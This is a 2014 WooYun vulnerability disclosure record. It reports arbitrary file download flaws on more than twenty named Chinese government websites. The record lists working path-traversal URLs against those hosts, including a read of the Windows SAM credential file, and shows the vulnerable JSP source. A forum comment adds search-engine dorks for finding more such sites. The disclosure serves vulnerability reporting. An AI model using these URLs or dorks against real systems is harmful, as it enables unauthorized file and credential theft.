{"id": 2921, "wybug_id": "wooyun-2014-062347", "wybug_title": "大批gov.cn政府网站任意文件下载(此处列出20余个)", "wybug_corp": "cncert国家互联网应急中心", "wybug_author": "风情万种", "wybug_date": "2014-05-30 11:01", "wybug_open_date": "2014-07-14 11:02", "wybug_type": "任意文件遍历/下载", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["任意文件读取利用", "任意文件读取", "服务配置不当", "任意文件遍历下载"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-05-30：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-06-04：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-06-14：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-06-24：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-07-04：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-07-14：\t细节向公众公开  简要描述： 大批gov.cn政府网站任意文件下载(此处列出) 详细说明：  http://www.grny.gov.cn/grny/images/stories/download.php?filename=download.phphttp://zzz.lgq.gov.cn/admin/infofiles/download.php?filepath=./download.php&filename=download.phphttp://fwpt.hnjgdj.gov.cn/web/download.action?fileName=../../index.jsphttp://bdanews.bda.gov.cn/front/download.action?fileName=index.jsphttp://www.yhmohrss.gov.cn/lemis/netweb/detail/download.jsp?url=/netweb/detail/&filename=download.jsphttp://www.cqldbz.gov.cn/wssb/download.jsp?filename=../index.jsphttp://www.hbcy.gov.cn/application/bgxz/download.jsp?filename=F:/web_changyang/public_html/application/bgxz/index.jsphttp://www.eqsc.gov.cn/manage/content/docmanage/download.jsp?filePath=/manage/content/docmanage/download.jsphttp://www.hazk.lss.gov.cn/12333/web/secondLevelPage/download.jsp?filename=../../../index.jsphttp://jld.cq.gov.cn/bgxz/download.jsp?filename=../index.jsphttp://www.cdetdz.gov.cn/edp/edpweb/downLoad.jsp?diskURL=D:/bssoft/edp/WebRoot/edpweb/downLoad.jsp&fileName=index.jsphttp://www.symzj.gov.cn/symz/mzxxw/zlxz/download.jsp?filename=../../../index.jsphttp://fwzx.bjpg.gov.cn/xzfwzx/system/download.jsp?filename=../download.jsphttp://www.szwen.gov.cn/download.jsp?fileName=download.jsphttp://www.yhmohrss.gov.cn/lemis/netweb/detail/download.jsp?url=C:\\windows\\system32\\&filename=cmd.exehttp://www.ahmasepa.gov.cn:8088/masWeb/jsp/include/download.jsp?filename=../index.jsphttp://www.js.lss.gov.cn/Auditing/download.jsp?filename=../index.jsphttp://www.jiaohe.gov.cn/main/download.jsp?fileName=../index.jsphttp://www.ccfwy.gov.cn/wjxz/download.jsp?filename=../index.jsphttp://sh.hljagri.gov.cn/download.jsp?filename=../index.jsphttp://www.qzlyj.gov.cn/download.jsp?filename=../../index.jsphttp://www.ccgp-qinghai.gov.cn/download.jsp?filename=C:\\Windows\\System32\\config\\SAMhttp://www.nbzj.gov.cn/cms/1120/plus/download.php?open=edit&link=download.php   漏洞证明：  其中一个download.jsphttp://www.yhmohrss.gov.cn/lemis/netweb/detail/download.jsp?url=/netweb/detail/&filename=download.jsp\n<%@ page contentType=\"text/html;charset=gb2312\" import=\"com.jspsmart.upload.*,java.io.File\" %><%// 新建一个SmartUpload对象SmartUpload su = new SmartUpload();// 初始化su.initialize(pageContext);// 设定contentDisposition为null以禁止浏览器自动打开文件，//保证点击链接后是下载文件。若不设定，则下载的文件扩展名为//doc时，浏览器将自动用word打开它。扩展名为pdf时，//浏览器将用acrobat打开。su.setContentDisposition(null);// 下载文件String url=request.getParameter(\"url\");String filename=request.getParameter(\"filename\");String path=url+File.separator+filename;System.out.println(\"OOOOOOOOOOOOOOOO\"+File.separator);try{\tsu.downloadFile(path);\tout.clear();out = pageContext.pushBody();}catch(Exception ex){ex.printStackTrace();%><script language=\"javascript\">alert(\"该文件已经不存在!\");window.close();</script><%}%>\n其它的信息我就不说了   修复方案：  .....   版权声明：转载请注明来源 风情万种@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2014-06-04 10:02 厂商回复： 感谢白帽子做的批量检测工作，未认定为通用，已经根据所述实例测试下发给对应的多个分中心，由分中心进行事件型漏洞通报处置。rank 打满。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-05-30 11:11 |    \t\tJasonfcku \t\t\t( 路人 |\t\t\t        Rank:13 漏洞数:2        | 小白一只，求不社。)\t\t \n  我了个去，现在都开始玩大爆发了？不一个一个的刷了？    \n     2014-05-30 11:32 |    \t\tT0XD88 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:2        | 会写代码的心理咨询师)\t\t \n  这么刷牛    \n     2014-05-30 12:15 |    \t\t暧昧 \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:3        | 此号乃是吾用来装孙子也)\t\t \n  土豪   我们交朋友吧    \n     2014-05-30 15:06 |    \t\t→Ｈack涛 \t\t\t( 普通白帽子  |\t\t\t        Rank:158 漏洞数:55        | 好好学习，天天向上！)\t\t \n  你是想说一分一个啊    \n     2014-05-31 00:02 |    \t\t风情万种 \t\t\t( 普通白帽子  |\t\t\t        Rank:181 漏洞数:63        | 不再相信爱了)\t\t \n  @Jasonfcku heih    \n     2014-05-31 12:18 |    \t\tby小星星 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:4        | 我会唱小星星、)\t\t \n     估计是同一套系统吧。  求个0day、    \n     2014-05-31 18:40 |    \t\tJasonfcku \t\t\t( 路人 |\t\t\t        Rank:13 漏洞数:2        | 小白一只，求不社。)\t\t \n  @by小星星 我也要，要到了给我一份    \n     2014-06-24 14:17 |    \t\tU神 \t\t\t( 核心白帽子 |\t\t\t        Rank:1285 漏洞数:142        | 感谢乌云，知恩不忘，其实我一直都在乌云默...)\t\t \n  找这个漏洞很简单！随手我可以抓出100个来    \n     2014-07-01 02:20 |    \t\tby小星星 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:4        | 我会唱小星星、)\t\t \n  @U神 关键看什么的。    \n     2014-07-14 11:03 |    \t\tEv1l \t\t\t( 实习白帽子  |\t\t\t        Rank:68 漏洞数:20        | 问题真实存在但影响不大。联系邮箱security...)\t\t \n  我草，Rank满了    \n     2014-07-14 11:12 |    \t\takast \t\t\t( 普通白帽子  |\t\t\t        Rank:244 漏洞数:39        | NEURON & LEUKOCYTE)\t\t \n  inurl:download.jsp?filename=inurl:download.action?fileName=    \n     2014-07-14 11:12 |    \t\tU神 \t\t\t( 核心白帽子 |\t\t\t        Rank:1285 漏洞数:142        | 感谢乌云，知恩不忘，其实我一直都在乌云默...)\t\t \n  为什么不是老和尚啊    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}